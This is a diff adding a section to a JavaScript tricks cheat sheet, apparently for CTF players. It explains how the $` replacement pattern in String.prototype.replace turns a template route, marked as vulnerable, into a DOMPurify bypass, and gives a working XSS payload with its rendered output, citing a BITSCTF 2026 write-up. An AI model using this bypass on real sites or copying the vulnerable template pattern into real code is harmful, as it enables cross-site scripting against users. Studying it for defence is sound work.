@@ -1,5 +1,66 @@
 # JS Tricks
 
+## String.prototype.replace()
+
+- the replace functions is used a lot of times in the context of building templates instead of some templating engine
+
+for example:
+
+```javascript
+app.get("/paste/:id", (req, res) => {
+  const content = pastes.get(req.params.id);
+  const html = pasteTemplate.replace("{paste}", content); // <-- VULNERABILITY
+  res.type("html").send(html);
+});
+```
+
+- The user input is the [replacement](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace) parameter ,which supports special replacement symbols:
+
+|Pattern |Inserts|
+|--------|-----------|
+|$$ |	Inserts a "$".|
+|$& |	Inserts the matched substring.|
+|$`|	Inserts the portion of the string that precedes the matched substring.|
+|$' |	Inserts the portion of the string that follows the matched substring.|
+|$n |	Inserts the nth (1-indexed) capturing group where n is a positive integer less than 100.|
+|$\<Name> |	Inserts the named capturing group where Name is the group name.|
+
+- Trying to sanitize user input with DOMPurify will fail since the attacker can inject a single ***$`*** and subvert the logic of html
+
+- [BITCTF 2026 - safepaste](https://github.com/raa2015/ctf-write-ups/blob/master/BITSCTF%202026/SAFEPASTE/writeup_safepaste.md)
+
+
+```html
+<a title="$`<noembed></noembed><img src=x onerror='alert(1)'>">Z</a>
+```
+
+- Will generate:
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SafePaste - View Paste</title>
+  </head>
+  <body>
+  ...
+<div class="content"><a title="<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  ...
+  <title>SafePaste - View Paste</title>
+</head>
+<body>
+  ...
+    <div class="content"><noembed></noembed><img src=x onerror='alert(1)'>">Z</a></div>
+```
+
+- title attribute's value will close in the next double-quotes, that is in `lang="` and `en">` will close the a tag
+- the rest is parsed as ordinary html, but DOMPurify will leave the title attribute unfiltered. 
+
 ## Function code to string
 
 - In JavaScript, you can get function body by casting it to a string:
